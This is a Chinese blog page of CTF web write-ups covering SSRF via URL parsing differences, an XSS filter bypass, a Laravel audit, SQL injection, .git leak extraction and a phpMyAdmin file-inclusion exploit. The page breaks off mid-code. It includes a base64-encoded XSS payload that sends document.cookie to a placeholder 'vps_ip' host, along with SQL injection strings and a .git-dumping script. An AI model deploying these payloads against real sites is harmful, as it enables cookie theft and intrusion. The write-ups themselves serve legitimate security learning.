<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>Iuhrey的幻想乡</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
<meta property="og:type" content="website">
<meta property="og:title" content="Iuhrey的幻想乡">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Iuhrey的幻想乡">
<meta property="og:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Iuhrey的幻想乡">
<meta name="twitter:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
  
    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
  
  
    <link rel="icon" href="source/images/favicon.ico">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
  

</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>29</strong><br>文章</div></a>
      <a href="/categories"><div><strong>3</strong><br>分类</div></a>
      <a href="/tags"><div><strong>13</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main">
  
    <article id="post-近期比赛题目复现" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/02/25/近期比赛题目复现/" class="article-date">
  <time class="post-time" datetime="2019-02-25T10:54:47.000Z" itemprop="datePublished">
    <span class="post-month">2月</span><br>
    <span class="post-day">25</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/02/25/近期比赛题目复现/">近期比赛题目复现</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整个寒假都在学习挖洞相关的知识，ctf方面的投入比之前少了许多，近期比赛优秀的题目也比较多，所以写了这篇复现来记录一些新知识</p>
<h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><p>得到flag需要满足多个条件，前面多个条件都是ctf常见的，这里就不多叙述了，这题最主要的一个绕过点如下:</p>
<p><img src="/images/23/1.png" alt=""><br>先审计代码，第九步要求parse_url()解析url的域名要为百度的域名，第十步则是限制了协议要为http，所有限制过后，网站会对我们输入的url进行访问，后面明显看出可以利用ssrf读取admin.php，所以现在的矛盾在于如何使得curl解析的域名是本地的域名同时绕过第九步的限制。<br>这里就需要理解curl和parse_url对url域名解析的差异性了。在如下这个url中:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test@1.com@2.com</span><br></pre></td></tr></table></figure></p>
<p>curl解析的域名为1.com，而parse_url却是解析为2.com，还有类似的函数也是这样解析，如图:<br><img src="/images/23/2.png" alt=""><br>构造如上payload就能绕过了。</p>
<h2 id="HappyXss"><a href="#HappyXss" class="headerlink" title="HappyXss"></a>HappyXss</h2><p>这题目比较上一题，把script，href，onerror等等关键字都过滤了，而且无法加载远程src资源。<br>这里学到了一种新的思路，在前端中eval()函数并没有被过滤，因此我们可以利用它把我们传入的代码转换成xss的payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(atob(base64后的代码));   //eval(atob(&quot;YWxlcnQoMSk=&quot;));</span><br><span class="line">eval(String.fromCharCode(ascii码));    //eval(String.fromCharCode(97,108,101,114,116,40,49,41));</span><br></pre></td></tr></table></figure></p>
<p>我们只需要让它带上cookie访问我们的服务器即可，因此payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href=&quot;http://vps_ip/&quot;+document.cookie</span><br></pre></td></tr></table></figure></p>
<p>注意的是””被过滤了，可以选择使用’’，最终payload如下，监听端口查看cookie就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=javascript:eval(atob(&apos;d2luZG93LmxvY2F0aW9uLmhyZWY9Imh0dHA6Ly92cHNfaXAvIitkb2N1bWVudC5jb29raWU=&apos;)); autofocus&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="HappyPHP"><a href="#HappyPHP" class="headerlink" title="HappyPHP"></a>HappyPHP</h2><p>这题目主要考察代码审计，登入界面有个提示可以拿到源码。<br>题目框架为laravel，根据大师傅的wp，学到了分析源码的基本步骤。<br>首先从路由开始，也就是/routes/web.app，可以分析出该网站有多少个页面，分别是什么功能。<br>接着从第一条开始，逐条追踪，查看详细代码的构成，一步一步审计直到找到可利用点。必要时可以使用全局搜索找我们所要的关键信息。<br>分析如何利用，构造payload，达到所要的目的。<br>在SessionsController.php发现可利用的点:<br><img src="/images/23/3.png" alt=""><br>这里代码可以进行注入，并且它会把结果返回给我们。联想到题目提示，flag在admin下，我们可以想到利用注入把email和password给注入出来。可以在/database/factories/UserFactory.php看到列的参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email:admin@hgame.com</span><br><span class="line">password:eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==</span><br></pre></td></tr></table></figure></p>
<p>对password进行base64解码得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;iv&quot;:&quot;rnVrqfCvfJgnvSTi9z7KLw==&quot;,&quot;value&quot;:&quot;EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=&quot;,&quot;mac&quot;:&quot;56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>继续通过全局搜索key，cipher来找到加密方式，发现在app.php中:<br><img src="/images/23/4.png" alt=""><br>全局搜索APP_KEY并没有搜索到，发现.env文件并不存在，所以回溯到github项目上找到被删除的.env文件:<br><img src="/images/23/5.png" alt=""><br>找到了我们所要的APP_KEY:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$key=&quot;9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=&quot;;</span><br></pre></td></tr></table></figure></p>
<p>结合上面的iv值和value值就可以解密被加密前的密码，登入即可拿到flag。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/02/25/近期比赛题目复现/" data-id="cjsk8gf1e001o5cvjmnn2uqan" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛总结/">比赛总结</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-NCTF-Web-wp" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/28/NCTF-Web-wp/" class="article-date">
  <time class="post-time" datetime="2018-11-28T13:13:28.000Z" itemprop="datePublished">
    <span class="post-month">11月</span><br>
    <span class="post-day">28</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/28/NCTF-Web-wp/">NCTF Web wp</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/赛后wp/">赛后wp</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期刚刚打完NCTF，成绩还算理想，虽然我们打了校内第二，总榜第七，但是赛后发现了很多问题，借此复盘一下这次的比赛。(Web题12道只做出了七道题目，赛后做了一道，实力还是欠缺一点)</p>
<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>抓包，得到flag.</p>
<h2 id="滴！晨跑打卡"><a href="#滴！晨跑打卡" class="headerlink" title="滴！晨跑打卡"></a>滴！晨跑打卡</h2><p>很明显这是一道注入题，抓包爆破测试一下过滤的字符发现空格，–，#，*等被过滤了，使用连接词测试一下语句构成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;or&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
<p>发现正常回显，可以判断大概是’ $_POST[\’XXX\’] ‘这种类型，空格可以使用%0b绕过，注释被过滤我们只要拼接语句让其正常查询不报错就行了，所以大致可以构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;union%0bselect%0b1,2,3%0b&apos;</span><br></pre></td></tr></table></figure></p>
<p>可以看到回显位：<br><img src="/images/22/1.png" alt=""><br>接着按照套路查询就行了，最后一步注意要标记是哪个数据库：<br><img src="/images/22/2.png" alt=""><br>得到flag.</p>
<h2 id="Go-Lakers"><a href="#Go-Lakers" class="headerlink" title="Go Lakers"></a>Go Lakers</h2><p>这题一开始套路和签到题一样，得抓包，拉到最下面发现这样一句话：<br><img src="/images/22/3.png" alt=""><br>按照要求post viewsource=1得到源码：<br><img src="/images/22/4.png" alt=""><br>这里我当时做的时候掉进陷阱了，我以为要绕过所有的条件才能利用file_get_contents()得到源码，这里只用传入加密后的file_参数就能输出源码了，这里分享绕过的方式吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if(!(getip() === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;9527&apos;]) === &apos;nctf_is_good&apos; &amp;&amp; mt_rand(1,10000) === intval($_GET[&apos;go_Lakers&apos;])))&#123;</span><br><span class="line">    header(&apos;location:https://bbs.hupu.com/24483652.html?share_from=kqapp&apos;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &apos;great&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>第一个条件可以使用XFF: 127.0.0.1来绕过，但是会有个提示:<br><img src="/images/22/5.png" alt=""><br>使用Client-IP就行了，第二个使用php://input协议传入字符就行，第三个我们可以使用多线程爆破，毕竟只有10000个数据。接下来就是加密函数了，按照解密函数写就行了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function en_code($value)&#123;</span><br><span class="line">    $result = &apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;strlen($value);$i++)&#123;</span><br><span class="line">        $result .= chr(ord($value[$i])+$i*2);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>直接读flag.php就能得到flag.</p>
<h2 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h2><p>题目就给了一个很直接的提示，猜测应该是.git泄露，测试果然发现没错:<br><img src="/images/22/6.png" alt=""><br>使用Githack脚本跑一下只能跑出一个README.md，打开发现了这样一句话:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Allsource files are in git tag1.0</span><br></pre></td></tr></table></figure></p>
<p>emmm，这就能联想这一篇文章：<a href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html</a><br>题目思路也很简单，就是让我们提取出源码就能得到flag了，具体原理可以看上面离别歌大师傅这篇文章，这里不讲太详细。<br>首先我们访问commit的一个“链接”:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20003/.git/refs/tags/1.0</span><br></pre></td></tr></table></figure></p>
<p>得到一串字符串，按照.git文件生成原理，我们访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20003/.git/objects/01/b878ee5f39810a02f06b4a560571413020ea42</span><br></pre></td></tr></table></figure></p>
<p>得到一个文件，通过对这个文件进行zlib解压发现了这个文件指向了两个文件:<br><img src="/images/22/7.png" alt=""><br>emmm，这里说下原理，我们就根据这两个字符串，按照刚刚的方法得到下一个文件，zlib解压，对文件的头进行判断，重复过程最终得到最初的文件，最后下载的文件我们没办法zlib解压，可以通过git cat-file xxxxx得到最终文件。这里贴个离别歌改过的脚本，我写了个注释有利于标识该改哪里:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line">import zlib</span><br><span class="line">import re</span><br><span class="line">import Queue</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0)&quot;</span><br><span class="line">        &quot; Gecko/20100101 Firefox/46.0&quot;</span><br><span class="line">&#125;#改头</span><br><span class="line">target = &quot;http://ctfgame.acdxvfsvd.net:20003/.git/&quot;  #地址</span><br><span class="line">output_folder = &quot;./n1ctf/&quot;   #储存文件的目录</span><br><span class="line"></span><br><span class="line">class GitDdatabase(object):</span><br><span class="line">    def __init__(self, data):</span><br><span class="line">        self.data = data</span><br><span class="line">        self.pos = 0</span><br><span class="line"></span><br><span class="line">    def read_to_next_char(self, char=&quot; &quot;):</span><br><span class="line">        pos = self.data.index(char, self.pos)</span><br><span class="line">        ret = self.read_exact(pos)</span><br><span class="line">        self.pos += 1</span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">    def read_exact(self, size):</span><br><span class="line">        ret = self.data[self.pos:size]</span><br><span class="line">        self.pos = size</span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">    def read_blob(self):</span><br><span class="line">        return re.sub(&apos;^blob \d+?\00&apos;, &apos;&apos;, self.data)</span><br><span class="line"></span><br><span class="line">    def read_tree(self):</span><br><span class="line">        mode = self.read_to_next_char(&quot; &quot;)</span><br><span class="line">        filename = self.read_to_next_char(&quot;\x00&quot;)</span><br><span class="line">        sha1 = self.read_exact(self.pos + 20)</span><br><span class="line">        return mode, filename, sha1</span><br><span class="line"></span><br><span class="line">    def get_db_type(self):</span><br><span class="line">        file_sort = self.read_to_next_char(&quot; &quot;)</span><br><span class="line">        file_size = self.read_to_next_char(&quot;\x00&quot;)</span><br><span class="line">        file_size = int(file_size)</span><br><span class="line">        return file_sort, file_size</span><br><span class="line"></span><br><span class="line">def request_object(id):</span><br><span class="line">    global target</span><br><span class="line">    folder = &apos;objects/%s/&apos; % id[:2]</span><br><span class="line">    response = requests.get(target + folder + id[2:])</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return zlib.decompress(response.content)</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    response = requests.get(target + &quot;refs/tags/1.0&quot;, headers=headers)</span><br><span class="line">    if response.status_code == 404:</span><br><span class="line">        print(&quot;No this tag&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    data = response.content</span><br><span class="line">    commit_id = data.strip()</span><br><span class="line"></span><br><span class="line">    next_id = commit_id   ##可以更改要找的目录的值，即可查找出其目录下的源码</span><br><span class="line">    print next_id</span><br><span class="line">    data = request_object(next_id)</span><br><span class="line">    if not data:</span><br><span class="line">        print(&quot;No this commit id&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    rex = re.search(ur&quot;commit .*?([a-f0-9]&#123;40&#125;)&quot;, data)</span><br><span class="line">    next_id = rex.group(1)</span><br><span class="line">    data = request_object(next_id)</span><br><span class="line">    if not data:</span><br><span class="line">        print(&quot;No this commit id&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    tasks = Queue.Queue()</span><br><span class="line">    gd = GitDdatabase(data)</span><br><span class="line">    file_sort, file_size = gd.get_db_type()</span><br><span class="line">    while 1:</span><br><span class="line">        try:</span><br><span class="line">            (mode, filename, sha1) = gd.read_tree()</span><br><span class="line">            basedir = &quot;./&quot;</span><br><span class="line">            tasks.put((mode, filename, sha1, basedir))</span><br><span class="line">        except ValueError as e:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    while 1:</span><br><span class="line">        if tasks.empty():</span><br><span class="line">            break</span><br><span class="line">        (mode, filename, sha1, basedir) = tasks.get()</span><br><span class="line">        sha1 = binascii.b2a_hex(sha1)</span><br><span class="line">        data = request_object(sha1)</span><br><span class="line">        if not data:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        gd = GitDdatabase(data)</span><br><span class="line">        file_sort, file_size = gd.get_db_type()</span><br><span class="line">        if file_sort == &quot;tree&quot;:</span><br><span class="line">            basedir = os.path.join(basedir, filename)</span><br><span class="line">            while 1:</span><br><span class="line">                try:</span><br><span class="line">                    (mode, filename, sha1) = gd.read_tree()</span><br><span class="line">                    tasks.put((mode, filename, sha1, basedir))</span><br><span class="line">                except ValueError as e:</span><br><span class="line">                    break</span><br><span class="line">        elif file_sort == &quot;blob&quot;:</span><br><span class="line">            data = gd.read_blob()</span><br><span class="line">            folder = os.path.join(output_folder, basedir)</span><br><span class="line">            if not os.path.exists(folder):</span><br><span class="line">                os.makedirs(folder)</span><br><span class="line">            filename = os.path.join(folder, filename)</span><br><span class="line">            with open(filename, &quot;wb&quot;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">            print(&quot;[+] Write &#123;filename&#125; success&quot;.format(filename=filename))</span><br></pre></td></tr></table></figure></p>
<p>最后可以得到两个flag,一真一假自己尝试。</p>
<h2 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h2><p>这个单纯就是考脚本能力了，题目有个提示：告诉我们有源码泄露，访问index.php.bak得到源码：<br><img src="/images/22/8.png" alt=""><br>里面关键点就在于<strong>intval()</strong>这个函数，这个函数在处理太过于大的数字的时候会出现漏洞，虽然说可以防止整数溢出漏洞，但是通过这样计算出的值就会出现bug。<br>通过本地测试，测试出在数字足够大时，intval()一直为2147483647，如图:<br><img src="/images/22/9.png" alt=""><br>但是在服务器上测试值却为9223372036854775807:<br><img src="/images/22/10.png" alt=""><br>最后测试也是9223372036854775807没错，所以脚本如下(记得使用session,以及time.sleep函数):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def cal(str):  #传入抓取的源码</span><br><span class="line">    pstr = &apos;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    jstr = &apos; &lt;/div&gt;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    num = len(jstr)</span><br><span class="line">    index = str.index(pstr) + len(pstr)</span><br><span class="line">    calstr = &quot;&quot;</span><br><span class="line">    for i in range(0, 71):</span><br><span class="line">        calnum = index + i * num</span><br><span class="line">        calstr = calstr + str[calnum]</span><br><span class="line">    if &quot;=&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;=&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;e&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;e&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;v&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;v&quot;, &quot;&quot;)</span><br><span class="line">    print calstr</span><br><span class="line">    return eval(calstr)</span><br><span class="line">def test(str):  #传入抓取的源码</span><br><span class="line">    pstr = &apos;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    jstr = &apos; &lt;/div&gt;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    num = len(jstr)</span><br><span class="line">    index = str.index(pstr) + len(pstr)</span><br><span class="line">    calstr = &quot;&quot;</span><br><span class="line">    for i in range(0, 71):</span><br><span class="line">        calnum = index + i * num</span><br><span class="line">        calstr = calstr + str[calnum]</span><br><span class="line">    if &quot;=&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;=&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;e&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;e&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;v&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;v&quot;, &quot;&quot;)</span><br><span class="line">    print calstr</span><br><span class="line">url = &quot;http://ctfgame.acdxvfsvd.net:20004/&quot;</span><br><span class="line">s = requests.session()</span><br><span class="line">re = s.get(url)</span><br><span class="line">content = re.content</span><br><span class="line">count = cal(content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count + 9223372036854775807&#125;)</span><br><span class="line">count1 = cal(res.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res1 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count1 + 9223372036854775807&#125;)</span><br><span class="line">count2 = cal(res1.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res2 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count2 + 9223372036854775807&#125;)</span><br><span class="line">count3 = cal(res2.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res3 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count3 + 9223372036854775807&#125;)</span><br><span class="line">count4 = cal(res3.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res4 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count4 + 9223372036854775807&#125;)</span><br><span class="line">print res4.content</span><br></pre></td></tr></table></figure></p>
<p>五次之后得到flag.</p>
<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>这题目当时卡死是因为没意识到guest/guest账号的存在，亏我还用50000条弱密码在爆破root密码，欸，要不然是可以做出来的。<br>首先可以查看下info.php，里面有一些最基本的信息。<br>使用guest/guest登入，发现这个东西:<br><img src="/images/22/11.png" alt=""><br>这东西写在这摆明了说来日我啊，这个可以联想到之前Chamd5爆出的这个漏洞：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd</a><br>具体源码分析可以看这一篇文章，接着利用点就很清晰了，我们只要把命令写进本地文件，然后通过本地文件包含执行命令就能拿到flag。这里我们可以利用session文件，session文件会记录当前cookies用户的操作，我们只要执行一个包含了命令的操作就行了。接下来就很简单了。<br>首先我们记录下现在cookies中phpmyadmin的值，为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 